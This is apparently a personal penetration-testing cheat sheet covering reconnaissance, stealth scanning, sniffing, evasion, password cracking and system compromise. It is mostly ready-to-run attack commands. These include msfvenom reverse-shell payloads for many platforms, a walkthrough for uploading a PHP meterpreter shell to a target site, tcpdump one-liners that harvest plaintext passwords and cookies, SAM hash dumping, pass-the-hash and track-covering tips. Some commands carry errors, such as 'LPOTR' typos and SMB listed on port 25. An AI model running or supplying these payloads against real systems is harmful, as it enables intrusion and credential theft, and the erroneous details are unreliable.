# PENETRATION_TEST

```bash
 > "Remember, hacking isn’t a race; it’s a test of will, patience, and preparation"
 > 
 > "follow the white rabbit....."
```

## PASSIVE_IG

### Google_Hacking

1. Files of a certain type on a certain website or domain. The Public Intelligence website provides example below (_Those search parameters return PDF documents on that website’s servers with the string “sensitive but unclassified” anywhere in the document text._)

    ```bash
    “sensitive but unclassified” filetype:pdf site:publicintelligence.net
    ```

1. Returns files located on a particular website or domain

    ```bash
    site:exampleWebOrDomain.net
    ```  
  
1. File extension (without a space) returns files of the specified type, such as DOC, PDF, XLS and INI. Multiple file types can be searched for simultaneously by separating extensions with “|”

    ```bash
    filetype:pdf|doc
    allintext:username filetype:log site:publicintelligence.net
    ```

1. Returns results with that sequence of characters in the URL

    ```bash
    inurl:"password"
    inurl:/proc/self/cwd site:publicintelligence.net
    ```

1. Returns files with the string anywhere in the text

    ```bash
    intext:somethingsomething
    ```

1. Must contains exactly word something

    ```bash
    "something" funny    
    ```

1. Every web contains banana but not loki word

    ```bash
    banana -loki   
    ```  
  
1. Cache for cached page (something like archive.org but not witch their power)

    ```bash
    cache:www.something.pl  
    ```

1. Show web page that have link to my target

    ```bash
    link:www.something.pl  
    ```

1. Show similar web page

    ```bash
    related:www.something.pl  
    ```

1. Show Open FTP servers

    ```bash
    intitle:"index of" inurl:ftp site:publicintelligence.net  
    ```

1. Show SSH private keys
  
    ```bash
    intitle:index.of id_rsa -id_rsa.pub site:publicintelligence.net
    filetype:log username putty site:publicintelligence.net
    ```

1. Show MP3, Movie, and PDF files

    ```bash
    intitle: index of mp3 site:publicintelligence.net
    intitle: index of pdf site:publicintelligence.net
    intext: .mp4 site:publicintelligence.net
    ```

1. Show cameras

    ```bash
    intitle:"Weather Wing WS-2"
    inurl:top.htm inurl:currenttime
    intitle:"webcamXP 5"
    inurl:"lvappl.htm"
    ```

### Email_Harvesting

1. Capture SMTP / POP3 Email

    ```bash
    tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
    ```

1. Email lists

    ```bash
    filetype:xls inurl:"email.xls" site:publicintelligence.net
    site:.edu filetype:xls inurl:"email.xls"
    ```

### Theharvester

1. The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database. A tool for gathering e-mail accounts and subdomain names from public sources.<br>This tool is intended to help Penetration Testers in the early stages of the penetration test in order to understand the customer footprint on the Internet. It is also useful for anyone that wants to know what an attacker can see about their organization.

1. Examples
   1. Search from email addresses from a domain (-d kali.org), limiting the results to 500 (-l 500), using Google (-b google)

    ```bash
    theharvester -d kali.org -l 500 -b google
    ```

   1. Organizations using PGP, such as journalists or anyone sending and receiving encrypted emails, are very easy to find in theHarvester. Below PGP key search in progress locating organizational email addresses.

    ```bash
    theharvester -d eff.org -l 500 -b pgp 
    ```

   1. Full sacan

    ```bash
    theharvester -d eff.org -l 500 -b all
    ```

### Additional_Resource

1. Check web in <https://www.netcraft.com/>
1. If I have an IP address and want to know who it belongs to <http://whois.domaintools.com/>
1. Go to the company web page, for simplicity I can download all and crawl by use of <https://www.httrack.com/> or <https://blackwidow.en.softonic.com/>
<br>__CAUTION!! Some web application data can be deleted in response to an information grab__
1. Go to <https://archive.org/>
1. Go to different online resources with google search
1. linkedin.com, pipl.com for user information
1. monster.com, indeed.com for job description

## ACTIVE_IG

### Types of records

| Type | Purpose Examples |
|--- | --- |
| A | IPv4 IP address 192.168.1.5 or 75.126.153.206 |
| AAAA | IPv6 IP address 2607:f0d0:1002:51::4 |
| CNAME | Canonical name record (Alias) s0.cyberciti.org is an alias for d2m4hyssawyie7.cloudfront.net |
| MX | Email server host names smtp.cyberciti.biz or mx1.nixcraft.com |
|NS | Name (DNS) server names ns1.cyberciti.biz or ns-243.awsdns-30.com |
| PTR | Pointer to a canonical name. Mostly used for implementing reverse DNS lookups 82.236.125.74.in-addr.arpa |
| SOA | Authoritative information about a DNS zone see below |
| TXT | Text record see below |

| Name |     Function   |     Describe |
| --- | --- | --- |
|SRV  |       Service   |      This record defines the hostname and port number of servers providing specific services, such as a Directory Services servers.|
| SOA  |       Start of    |    This record identifies the primary name server for the zone. Authority The SOA record contains the hostname of the server responsible for all DNS records within the namespace, as well as the basic properties of the domain|
| PTR  |       Pointer  |       This maps an IP address to hostname (providing for reverse DNS lookups) You don`t absolutely need a PTR record for every entry in main DNS namespace, but these are usually associated with e-mail server records|
| NS   |       Name Server  |   This record defines the name servers within my namespace. These servers are the ones that respond to main client`s for name resolution|
| MX |    Mail exchange  | Defines the mail server of a domain|
| CNAME |      Canonical Name | This record provides for domain name aliases within main zone. For example, I may have an FTP service and a web service running on the same IP address. CNAME records could be used to list both within DNS for me|
| A     |      Address    |     This record maps an IP address to a hostname and is used most often for DNS lookups|
| CERT | Certificate | Record for PGP server or similar|
| DHCID | | Defines DHCP server for a domain|
| DNAME |  | Alias for a domain name|
| IPSECKEY ||             Key to use for IPsec|
|RP ||             Responsible person|
|SSHFP||              SSH public key|

### DNS check nslookup

1. To perform a DNS lookup, I cam simply enter the domain or subdomain to query and press enter on your keyboard.
2. The __"set type"__ command will let me query a particular type of DNS record. Examples:

    ```bash
    > set type=mx
    > targetDomain.com
    ```

    ```bash
    > set type=ns
    > targetDomain.com
    ```

    ```bash
    > set type=soa
    > targetDomain.com
    ```

3. I can switch NSlookup to query one of authoritative nameservers for domain name.

    ```bash
    > server example.soa.server.com
    ```

### dnsrecon command

Based on response from DNS server it identify if the host exist or not. Dnsrecon is a powerful DNS enumeration script, powered by KaliLinux.

1. For lookup

    ```bash
    dnsrecon -d strona.org              
    ```

1. For reverse lookup

    ```bash
    dnsrecon -r 192.168.1.120-192.168.1.139
    ```

1. For zone walking

    ```bash
    dnsrecon -d strona.org -t zonewalk
    ```

1. Scan a domain ("-d example.com"), use a dictionary to brute force hostnames ("-D /usr/share/wordlists/dnsmap.txt"), do a standard scan ("-t std"), and save the output to a file ("–xml dnsrecon.xml")

    ```bash
    dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml
    ```

### host command

1. Use host to find all the host records for a zone:

    ```bash
    host -l domain
    ```

1. Use host to request all the records for a zone:

    ```bash
    host -lv -t any domain
    ```

## SCANNING METHODOLOGY

### CORE

1. Scan via proxy.
   1. Nmap-scan-through-tor (<https://www.aldeid.com/wiki/Tor/Usage/Nmap-scan-through-tor>)
   1. Nmap decoys ip (quiet) with fragmentation scan that creates smaller packages reassemble in target (quiet).
      1. decoys ip with fragmentation

            ```bash
            nmap -f -D RND 192.168.1.110

            192.168.1.110 == target
            ```

      1. generates a number of decoys and randomly puts the real source IP between them

            ```bash
            nmap -D RND:10 192.168.1.110
            
            192.168.1.110 == target
            ```

1. Check for live systems.
   1. Use ping command and its types (<https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol#Control_messages>)
   1. Ping sweep

        ```bash
        nmap -sn 192.168.1.0/24
        ```

1. Check for open ports (nmap).
   1. Open ports will respond with a SYN/ACK, and closed ports will respond with an RST.

        ```bash
        nmap -sT 192.168.1.0/24
        ```

   1. SYN Stealth Scan [-sS]

        ```bash
        nmap -sS 192.168.1.0/24
        ```

   1. FIN and Null scans are less likely to show up in a logging system compered to -sS

        ```bash
        nmap -sF 192.168.1.0/24
        nmap -sN 192.168.1.0/24
        ```

   1. Discovering open ports on via netcat

       ```bash
       nc -z -vv -w 1 192.168.1.100 20-25

       -z = Zero-I/O mode, report connection status only
       -vv = Use more than once (-vv, -vvv...) for greater verbosity. With -v it will be verbose and display all kinds of useful connection based information
       -w 1 = wait for 1 sec
       20-25 = port range
       ```

   1. Inverse TCP flag (If the port is open, there will be no response. If the port is closed, an RST/ACK will be sent in response.)

        ```bash
        nmap --scanflags FIN 192.168.1.0/24
        nmap --scanflags URG 192.168.1.0/24
        nmap --scanflags PSH 192.168.1.0/24
        ```

   1. IDLE scan (zombi scan) uses a spoofed IP address (an idle zombie system) to elicit port responses during a scan. Designed for stealth, this scan uses a SYN flag and monitors responses as with a SYN scan.
      1. Check if system can perform a scan

            ```bash
            nmap --script ipidseq 192.168.1.0-255
            ```

      1. Look for main zombi ip (Host script results == ipidseq: Incremental) and use it

            ```bash
            nmap -sI 192.168.1.100 -Pn 192.168.1.111

            -sI == idle(zombi 192.168.1.100 from previous scan)
            -Pn == no ping (target 192.168.1.111)
            ```

   1. ACK scan also as a safe alternative

        ```bash
        nmap -sA 192.168.1.0/24
        ```

1. Banner grabbing and OS fingerprinting will tell what operating system is on the machines.
   1. Verifies operating system (aggressive, active)

        ```bash
        nmap -O 192.168.1.0/24
        ```

   2. Service verification (aggressive, active)

        ```bash
        nmap -sV 192.168.1.0/24
        ```

   3. Combined option -O and -sV + others nmap scripts (very aggressive, active)

        ```bash
        nmap -A 192.168.1.0/24
        ```

   4. Verifying operating system on the host (active)

        ```bash
        xprobe2 192.168.1.0
        ```

   5. Read response from telnet command (pasive)

        ```bash
        telnet 192.168.1.12 80 #(for system info)
        telnet 192.168.1.12 25 #(form mail info)
        ```

   6. read response from netcat command (pasive)

        ```bash
        nc 192.168.1.12 80 #(for system info)
        nc 192.168.1.12 25 #(form mail info)
        ```

1. Scan for vulnerabilities.
   1. Check for potential flaws using a fuzzers like intruder in BurpSiut. Lists for payloads may came from different places. For example kali wordlists. But great place to start is <https://github.com/fuzzdb-project/fuzzdb>
   1. Program to use:

        ```bash
        >   Openvas (free, Linux)
        >   Retina, Nessus, CORE Impact, Nexpose (free, Windows/Linux)
        >   SPARTA
        ```

   1. Look for:

        ```bash
        > Misconfiguration
        > Default Installations 
        > Buffer Overflows
        > Missing Patches
        > Design Flaws
        > Operating System Flaws
        > Application Flaws
        > Default Passwords
        ```

1. Web pages directory traversal pluse some more <https://www.zaproxy.org/>

### tcpdump SCANNING TOOL

1. Tcpdump uses a small language called BPF to let me filter packets. When I run "sudo tcpdump port 53", "port 53" is a BPF filter.

2. I can use "and", "or", and "not"

    ```bash
    tcpdump host 11.22.33.44 and port 80  
    ```

3. Other BPF filters

    ```bash
    src port 80
    dest port 80
    tcp port 80
    src host 1.2.3.4
    dest host 1.2.3.4
    ```

4. What dns queries is my laptop sending (_PS. Flag [.] means ACK_)?

    ```bash
    tcpdump -n -p -i any port 53

    -n = do not resolve names
    -p = makes sure I only get packets that are to or from my computer   
    -i = chose interface
    ```

5. I have a server running on port 1337. Are any packets arraiving at that port at ALL ??

    ```bash
    tcpdump -i any port 1337
    ```

6. What packets are coming into my server (port 1337) from ip 1.2.3.4 ?

    ```bash
    tcpdump port 1337 and host 1.2.3.4  
    ```
  
7. How long are the TCP connections on this box listing right now ? <br>_Resoult file analyze by WIRESHARK_

    ```bash
    tcpdump -c 10000 -w packets.pcap

    -c = count _only capture 10000 packets in example above_
    -w = writes _write to a .pcap file_
    ```

8. Extract HTTP User Agents

    ```bash
    tcpdump -nn -A -s1500 -l | grep "User-Agent:"
    tcpdump -nn -A -s1500 -l | egrep -i 'User-Agent:|Host:'
    ```

9. Capture only HTTP GET

    ```bash
    tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'
    ```

10. Capture only HTTP POST

    ```bash
    tcpdump -s 0 -A -vv 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354'
    ```

11. Extract HTTP Request URL's

    ```bash
    tcpdump -s 0 -v -n -l | egrep -i "POST /|GET /|Host:"
    ```

12. Extract HTTP Passwords in POST Requests

    ```bash
    tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
    ```

13. Capture Cookies from Server and from Client

    ```bash
    tcpdump -nn -A -s0 -l | egrep -i 'Set-Cookie|Host:|Cookie:'
    ```

14. Capture all ICMP packets

    ```bash
    tcpdump -n icmp
    ```

15. Show ICMP Packets that are not ECHO/REPLY (standard ping)

    ```bash
    tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'
    ```

16. Capture SMTP / POP3 Email

    ```bash
    tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
    ```

17. Troubleshooting NTP Query and Response

    ```bash
    tcpdump dst port 123
    ```

18. Capture SNMP Query and Response

    ```bash
    tcpdump -n -s0  port 161 and udp
    ```

19. Capture FTP Credentials and Commands

    ```bash
    tcpdump -nn -v port ftp or ftp-data
    ```

20. Capture Start and End Packets of every non-local host

    ```bash
    tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'
    ```

21. Capture DNS Request and Response

    ```bash
    tcpdump -i wlp58s0 -s0 port 53
    ```

22. Capture HTTP data packets

    ```bash
    tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
    ```

23. Top Hosts by Packets

    ```bash
    tcpdump -nnn -t -c 200 | cut -f 1,2,3,4 -d '.' | sort | uniq -c | sort -nr | head -n 20
    ```

24. Capture all the plaintext passwords

    ```bash
    tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -l -A | egrep -i -B5 'ss=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user '
    ```

25. DHCP Example

    ```bash
    tcpdump -v -n port 67 or 68
    ```

26. Capture with tcpdump and view in Wireshark

    ```bash
    ssh root@remotesystem 'tcpdump -s0 -c 1000 -nn -w - not port 22' | wireshark -k -i -
    ```

## ENUMERATION

1. Enumeration by SMTP (Simple Mail Transfer Protocol, ports 25 or 587)
   1. I can use metasploit and __auxiliary/scanner/smtp/smtp_version__ for checking (Always look at auxiliary/scanner/ for enumerators in metasploit).
   1. If results are ok then use __auxiliary/scanner/smtp/smtp_enum__
   1. After that I may also search executable program __smtp-user-enum.pl__
   1. When I run it (__./smtp-user-enum.pl__) I get help options. Example usage are:

        ```bash
        ./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120
        ```

1. I can verify LDAP by using SMTP commands in telnet

    ```bash
    telnet 192.168.1.12
    (Verifying a User Name)
        > S: VRFY Smith
        R: 250 Fred Smith <Smith@USC-ISIF.ARPA> 
        Or
        > S: VRFY Jones
        R: 550 String does not match anything.

    (Expanding a Mailing List)
        > S: EXPN Example-People
        R: 250-Jon Postel <Postel@USC-ISIF.ARPA>
        R: 250-Fred Fonebone <Fonebone@USC-ISIQ.ARPA>
        R: 250-Sam Q. Smith <SQSmith@USC-ISIQ.ARPA>
        R: 250-Quincy Smith <@USC-ISIF.ARPA:Q-Smith@ISI-VAXA.ARPA>
        R: 250- <joe@foo-unix.ARPA>
        R: 250 <xyz@bar-unix.ARPA>
        Or
        > S: EXPN Executive-Washroom-List
        R: 550 Access Denied to You.

    (Verify e-mail address of the recipient)
        > S: EHLO
        (or HELLO depends on a server)
        > S: MAIL FROM: <you@server.com>
        (address with the same domain as the server)
        > S: RCPT TO: <friend@friendsdomain.com>  
        (address to verify)
        R: 250 OK – MAIL FROM <you@yourdomain.com>
        OR
        > S: EHLO
        (or HELLO depends on a server)
        > S: MAIL FROM: <you@server.com>
        (address with the same domain as the server)
        > S: RCPT TO: <friend@friendsdomain.com>  
        (address to verify)
        R: error
        (the e-mail address you are trying to send a message to may be
        blocked or it doesent`exist)
    ```

1. Examples of the Linux enumeration commands are:
   1. finger = provides information on the user and host machine,
   1. rpcinfo and rpcclient = which provide information on RPC in the environment,
   1. showmount = which displays all the shared directories on the machine.

1. NetBios enumeration (ports 137 - 139, TCP or UDP)
   1. SuperScan by MCAffe <https://sectools.org/tool/superscan/>
   1. Winfingerprint = Win32 Host/Network Enumeration Scanner <https://packetstormsecurity.com/files/38356/winfingerprint-0.6.2.zip.html>
   1. In my current Windows system, I can use the built-in utility nbtstat

        ```ps
        nbtstat                 #(for help)
        nbtstat -n              #(for mine local table)
        nbtstat -c              #(for the cache)
        nbtstat -A IPADDRESS    #(for a remote system’s table)
        ```

1. Enumeration by DNS (port 53, UDP or TCP) and dnsrecon (A powerful DNS enumeration script, powerd by Kali)

    ```bash
    dnsrecon -d strona.org  #(for lookup)
    dnsrecon -r 192.168.1.120-192.168.1.139 #(for reverse lookup)
    dnsrecon -d strona.org -t zonewalk #(for zone walking) 
    ```

1. For enumeration by SMB (Server Message Block; for example cifs, port 25) I can use metasploit and __auxiliary/scanner/smb/smb_enumusers__

1. Enumeration by SSH (Secure Shell, port 22) I can use metasploit and __auxiliary/scanner/ssh/ssh_enumusers__

1. Web page written in wordpress enumeration

```bash
wpscan --url http://10.0.2.8/beckup-wordpres --enumerate p 
 
p option is for plugins (more on that after wpscan -h) 
PS. sometime is good idea to add wp_content_dir (more on that in wpscan -h) 
```

## SNIFFING

1. Arp Poison. ARP is a broadcast protocol, which means ARP poisoning attempts can trigger alerts.
   1. Direct all communication from target to attacker system:

        ```bash
        etercap -T -M arp:oneway /192.168.1.100/
        ```

   1. For more, I can use programs like "dsniff" (Linux) or "Cain and Able" (Windows)

1. MAC spoofing (a.k.a. MAC duplication). Process of figuring out the MAC address of the system
    1.Arch got good wiki about that <https://wiki.archlinux.org/index.php/MAC_address_spoofing>

1. DHCP starvation. Can be carried out by tools such as Yersinia or DHCPstarv <https://tools.kali.org/vulnerability-analysis/yersinia>

## EVASION OR NOT

1. IDS evasion
   1. Slow things down = consider adding -T1 flag to nmap command
   1. Flood the network. The large volume of alerts might be more than the staff can deal with <http://inundator.sourceforge.net/>
   1. Evasion through session splicing. When payloads are put into packets the IDS will simply ignore them. <http://packeth.sourceforge.net/packeth/Home.html>

1. FIREWALL evasion

   1. Identify which ports and protocols firewall is letting through and which ones has blocked (filtered). Firewalk program do the job but it is generally a noisy attack.

        ```bash
        firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.121

        -S8079-8081 = scanned ports
        -i interface
        -n do not resolve hostnames
        -p select protocol
        192.168.1.1 = gateway
        192.168.0.121 = target machine
        ```

   1. Already compromised machine inside the company. Usually firewalls don’t bother looking at packets with internal source addresses (Pown via email attachement or something like that).
   1. packeth <http://packeth.sourceforge.net/packeth/Home.html>

## ATTACKING A SYSTEM

Gaining Access, Escalating Privileges, Executing Applications, Hiding Files, Covering Tracks.

### WINDOWS

1. Search for SAM file (Security Accounts Manager) and System file
   1. Both file contain a hashes for crack and they are located in the same directory C:\windows\system32\config
   1. Bkhive and samdump2 work together to extract Windows password hashes from the SAM and SYSTEM files.
      1. For get system file

            ```bash
            bkhive system /root/fileToPutResults.txt
            ```

      1. For get SAM file

            ```bash
            samdump2 SAM /root/fileToPutResults.txt > /root/hash.txt 
            ```

   1. LM hashing would first take the password and convert everything to uppercase. Then, if the password was less than 14 characters, it would add blank spaces to get it to 14.Then the new, all-uppercase, 14-character password would be split into two 7-character strings. These strings would be hashed separately, with both hashes then combined for the output. LM hash value of seven blank characters will always be the same (AAD3B435B51404EE)!

1. net program for cmd to use a shares (something like momunt in Linux)
   1. Shows all systems in the domain name provided

        ```bash
        net view /domain:domainname
        ```

   1. Provides a list of open shares on the system named

        ```bash
        net view \\systemname
        ```

   1. Sets up a null session

        ```bash
        net use \\target\ipc$
        ```

   1. Mount the folder fileshare on the remote machine somename

        ```bash
        net use Z: \\somename\fileshare
        ```

1. Domain controller Ntds.dit file. Take the Ntds.dit ESE database file located in %SystemRoot%\NTDS\Ntds.dit or %SystemRoot%\System32\Ntds.dit. The NTDS.DIT file is effectively the entire Active Directory. TODO look for tools to extract from file.

1. Kerberos "golden ticket"
   1. Attacker creates his own Kerberos TGT that is presented to the TGS. The hashes are loaded into the Local Security Authority Subsystem, which runs as an executable (%System Root%\System32\Lsass.exe) and is responsible for a variety of things, including user authentication.

   1. For pass-the-hash attack, first I need to steal hashes from users already connected to my target server
   1. Next, using tools like mimikatz, I copy and paste one of the hashes (preferably a hash from a user with administrative privileges) in main local Lsass <https://github.com/gentilkiwi/mimikatz>

      1. Mimikatz allows to extract passwords in plain text, and per the website. It steal hashes, PIN code and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket or build Golden tickets. Metasploit has included mimikatz as a meterpreter script, which allows easy access to all features without uploading any additional files to the target host.

1. Registry important entries

    ```ps
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    ```

### LINUX

1. File shares check
   1. I can check if I can mount some shares in a target system (in metasploit)

        ```bash
        use auxiliary/scanner/nfs/nfsmount
        ```

   1. After that I know if I can mount something simple like that

        ```bash
        mount -o nolock -t nfs 10.10.10.125:/ /tmp/metasploitable

        10.10.10.125:/ = is a "/" directory on a target "10.10.10.125"
        ```

1. When to use NFS and when to use Samba

|Server O/S      |  Client O/S    |    Use Samba or NFS?|
|--|--|--|
|Linux           | Linux        |    NFS|
|Windows         |   Linux      |      Samba|
|Linux           | Windows      |      Samba|
|Windows         |   Windows   |        Samba|

### SYSTEMS (and John)

1. Man in the middle
   1. sslsniff as a tool for automated MITM attacks on SSL connections <https://moxie.org/software/sslsniff/>

1. Password cracking with John
   1. John the Ripper is a Linux tool that can crack Unix, Windows NT, and Kerberos passwords.
   1. For the shadow files

        ```bash
        john -wordlist=/path/to/file/with/passwords.txt ~/preperd/shadowFile.txt
        ```

   1. I can use configure file to create more sophisticated word list <http://contest-2010.korelogic.com/rules.html>.  They can be viewed and added to in the file located at __/etc/john/john.conf__ under __#Wordlist mode rules__ To perform modifications according to these rules run the following command

        ```bash
        john -wordlist=rockyou.txt -rules -stdout > rockyouslownikpo.txt
        ```

   1. John can be used without wordlist. Then I can use specific format (nt2 is for windows ntlm, lm hashes). I can check the format by john __/root/fileWithHAsh.txt__

        ```bash
        john /root/fileWithHAsh.txt -format=nt2 -users=userName -show
        ```

   1. And I can use a brute force without a dictionary

        ```bash
        john -incremental:lanman /root/fileWithHAsh.txt

        lanman – Letters, numbers, and some special characters
        alpha  – Letters only
        digits – Numbers only
        all    – All possible characters
        ```

   1. I can also store a session and back to it atelier

        ```bash
        john -incremental:lanman /root/fileWithHAsh.txt -session=nameOfSesion

        restore by

        john -restore=nameOfSesion
        ```

1. Password cracking with Medusa
   1. display all modules currently installed

        ```bash
        medusa -d
        ```

   1. display specific options for a given module (in this example smbnt)

        ```bash
        medusa -M smbnt -q
        ```

   1. I can try for example to hack mysql

        ```bash
        medusa -h 192.168.1.120 -u root -p password -e ns -O mysql.medusa.out -M mysql
        ```

1. Password cracking with Hydra

    ```bash
    hydra -L /fileWithUserNames.txt -e ns 192.168.1.25 ssh
    hydra -L /fileWithUserNames.txt -P /PasswordsList.txt -e ns 192.168.1.25 ssh

    -e option allows search not defined (n) and passwords same like user-name (s)
    ```

1. Password cracking with Hashcat

    ```bash
    hashcat -a 0 -m 500 hash.txt wordlist.txt
    -a == attack mode and 0 = straight (more in man)
    -m == hash type and 500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 (much more in man)
    hash.txt == modified shadow file (remove "empty users", remove users name, remove last sings; only HASH))
    ```

1. sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
   1. example show web page witch potential sql with checking if current user is administrator and check current database

        ```bash
        sqlmap -u http://192.168.1.120/products.php?id=1 --current-user --is-dba --current-db
        ```

   1. Second example take users names and their passwords

        ```bash
        sqlmap -u http://192.168.1.120/products.php?id=1 --users --passwords
        ```

## PRIVILEGE ESCALATION

1. Armitage is a GUI front end for Metasploit that is free
1. In metasploit try VNC (Virtual Network Computing) for remote access to the target.
   1. I can check if it is possible to use vnc without any credentials (metasploit command)

        ```bash
        use auxiliary/scanner/vnc/vnc_none_auth
        ```

   1. If I got credentials I may use it as well with the metasploit __auxiliary/scanner/vnc/vnc_none_auth__

   1. there are a lot of exploits for privilege secalation (I must check out it elier)

## EXECUTING APPLICATION

1. All keyloggers, spyware, back doors and more.

1. And how to download it if ".exe", ".gz" and ".zip" are blocked?
   1. Use some non standard format as bzip2 (.bz2). Mayby it is not filtered.
   1. URLs are allowed to contain a "query string" (for passing in form field values through an HTTP GET), adding a "?x" to a download URL fools the regular expression filters of firewall but does not destroy the validity of the URL.
   1. Go to __NETCAT FILE TRANSFER AND REMOTE ADMINISTRATION__

## HIDING FILES AND COVERING TRACK

1. On LINUX add __.__ in front of file or a folder
1. On WINDOWS hide by gui or cmd command __attrib  +h filename__
1. Use tools for hiding files of all sorts in regular image files or other files (steganography)
   1. ImageHide <https://softfamous.com/imagehide/>
   1. Snow <http://www.darkside.com.au/snow/>
   1. Mp3Stego <https://www.petitcolas.net/steganography/index.html>
  
## ROOTKITS

1. For use of ready to go trojans __setoolkit__
1. For creating my own trojans with default settings i could use MSFVENOM. Below example is to create php payload.
   1. Creating a payload

        ```bash
        msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPOTR=6000 -e php/base64 -f raw > exploit.php

        # With -f i can precise format, I could use .exe for example if i do not whant to use php exploit.
        # The ip 10.0.2.15 is the attacker address.
        ```

   1. Add to exploit.php file strings ```<?php``` in the begining of the file and ```?>``` to the end
   1. Upload that payload to the web page
   1. Use ```exploit/multi/handler``` on ```msfconsole```
   1. Set LHOST and LPOTR like in peyload (attacker ip and listening port)
   1. exploit
   1. Go to the uploaded file ```www.target.pl/uploadfiles/exploit.php```
   1. That is it. I got meterpreter console on metasploit :)

1. MSFVENOM OPERATION
   1. Often one of the most useful is the msfpayload module. Multiple payloads can be created with this module and it creates something that can give me a shell.
   1. For each of these payloads I can go into ```msfconsole``` and select ```exploit/multi/handler.```. Run ```set payload``` for the relevant payload used and configure all necessary options (LHOST, LPORT, etc).
   1. List payloads

        ```bash
        msfvenom -l
        ```

   1. Binaries on LINUX

        ```bash
        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
        ```

   1. Binaries on WINDOWS

        ```bash
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
        ```

   1. Binaries on MAC

        ```bash
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
        ```

   1. Binaries for WEB
      1. PHP

            ```bash
            msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
            ```

      1. ASP. An application service provider (ASP) is a business providing computer-based services to customers over a network; such as access to a particular software application (such as customer relationship management) using a standard protocol (such as HTTP).

            ```bash
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
            ```

      1. JSP. A collection of technologies that helps software developers create dynamically generated web pages based on HTML, XML, SOAP, or other document types.

            ```bash
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
            ```

      1. WAR. Web Application Resource or Web application ARchive is a file used to distribute a collection of JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML and related files) and other resources that together constitute a web application.

            ```bash
            msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
            ```

   1. Scripting Payloads
      1. PYTHON

            ```bash
            msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
            ```

      1. BASH

            ```bash
            msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
            ```

      1. PERL

            ```bash
            msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
            ```

   1. ShellCode. For all shellcode see ```msfvenom –help-formats``` for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for mine exploits. Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive mine incoming shells. Handlers should be in the following format. Once the required values are completed the following command will execute your handler – ```msfconsole -L -r```

        ```bash
        use exploit/multi/handler
        set PAYLOAD <Payload name>
        set LHOST <LHOST value>
        set LPORT <LPORT value>
        set ExitOnSession false
        exploit -j -z

        msfconsole -L -r
        ```

      1. Linux Based Shellcode

            ```bash
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
            ```

      1. Windows Based Shellcode

            ```bash
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
            ```

      1. Mac Based Shellcode

            ```bash
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language> Handlers
            ```

========================================================================================================

## Web Applications Attacks

1. Identifying entry points with WebScarab, HTTPrint, ZAP or Burp Suite.
1. Cross-Site Scripting (XSS) <https://pentest-tools.com/blog/xss-attacks-practical-scenarios/>
   1. Check if the page is vulnerable by simply put javascript code next to the url

        ```bash
        Example url:     http://www.example.com/?name=test
        After check:     http://www.example.com/?name=test<script>alert(123)</script>
        ```

   1. Hijacking the user’s session

        ```bash
        Example url:     http://www.example.com/?name=test
        After check:     http://www.example.com/?name=test<script>alert(document.cookie)</script>
        ```

